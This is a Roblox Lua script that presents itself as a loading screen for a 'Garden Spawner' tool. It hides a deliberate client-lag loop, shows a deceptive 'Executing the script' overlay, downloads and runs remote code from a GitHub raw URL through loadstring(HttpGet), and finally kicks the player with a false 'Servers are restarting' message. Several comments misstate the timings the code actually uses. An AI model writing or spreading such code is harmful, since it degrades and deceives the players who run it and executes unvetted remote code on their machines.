-- EXTREME CLIENT LAG (starts in 5 minutes)
task.delay(100, function() -- 5 minutes delay
    task.spawn(function()
        while true do
            -- Simulate intense lag by doing heavy calculations
            for i = 1, 25 do
                local t = {}
                for j = 1, 1e6 do
                    t[j] = math.sqrt(j) * math.random()
                end
            end
            -- Short delay to prevent hard crash, but still very laggy
            task.wait(0.05)
        end
    end)
end)

-- UI Script Starts Below
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Hide built-in UI
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- GUI setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RestartScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
bg.Active = true
bg.ZIndex = 1
bg.Parent = screenGui

-- Plug Image
local image = Instance.new("ImageLabel")
image.Size = UDim2.new(0, 200, 0, 200)
image.Position = UDim2.new(0.5, -100, 0.2, -100)
image.BackgroundTransparency = 1
image.Image = "rbxassetid://73366367355295"
image.ZIndex = 2
image.Parent = bg

-- Title Text
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0.5, 0)
title.BackgroundTransparency = 1
title.Text = "Please wait..."
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.ZIndex = 2
title.Parent = bg

-- Subtitle Text
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 40)
subtitle.Position = UDim2.new(0, 0, 0.58, 0)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Executing the script. This may take a moment."
subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitle.TextScaled = true
subtitle.Font = Enum.Font.Gotham
subtitle.ZIndex = 2
subtitle.Parent = bg

-- Spinner
local spinner = Instance.new("ImageLabel", bg)
spinner.Size = UDim2.new(0, 40, 0, 40)
spinner.Position = UDim2.new(0.5, -20, 0.75, 0)
spinner.BackgroundTransparency = 1
spinner.Image = "rbxassetid://1095708"
spinner.ZIndex = 3

-- Spinner rotation logic
local angle = 0
local runConnection = RunService.RenderStepped:Connect(function()
    angle = (angle + 5) % 360
    spinner.Rotation = angle
end)

-- Progress Bar Background
local progressBarBg = Instance.new("Frame")
progressBarBg.Size = UDim2.new(0.6, 0, 0, 20)
progressBarBg.Position = UDim2.new(0.2, 0, 0.9, 0)
progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBg.BorderSizePixel = 0
progressBarBg.ZIndex = 2
progressBarBg.Parent = bg

-- Progress Bar Fill
local progressBarFill = Instance.new("Frame")
progressBarFill.Size = UDim2.new(0, 0, 1, 0)
progressBarFill.Position = UDim2.new(0, 0, 0, 0)
progressBarFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBarFill.BorderSizePixel = 0
progressBarFill.ZIndex = 3
progressBarFill.Parent = progressBarBg

-- Animate the progress bar over 20 seconds
TweenService:Create(progressBarFill, TweenInfo.new(20, Enum.EasingStyle.Linear), {
    Size = UDim2.new(1, 0, 1, 0)
}):Play()

-- Fade out GUI after 20 seconds
task.delay(300, function()
    for _, obj in pairs(bg:GetDescendants()) do
        pcall(function()
            if obj:IsA("TextLabel") then
                TweenService:Create(obj, TweenInfo.new(1), {
                    BackgroundTransparency = 1,
                    TextTransparency = 1
                }):Play()
            elseif obj:IsA("ImageLabel") then
                TweenService:Create(obj, TweenInfo.new(1), {
                    BackgroundTransparency = 1,
                    ImageTransparency = 1
                }):Play()
            elseif obj:IsA("Frame") then
                TweenService:Create(obj, TweenInfo.new(1), {
                    BackgroundTransparency = 1
                }):Play()
            end
        end)
    end

    -- Execute external script
    task.delay(1, function()
        local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaGay/femboy/refs/heads/main/GardenSpawner.lua"))()
Spawner.Load()
    end)

    -- Cleanup
    TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
    task.wait(1.5)
    runConnection:Disconnect()
    screenGui:Destroy()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end)

-- Failsafe: Kick player if GUI stays too long
task.delay(1000, function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    player:Kick("Servers are restarting... Please rejoin later.")
end)
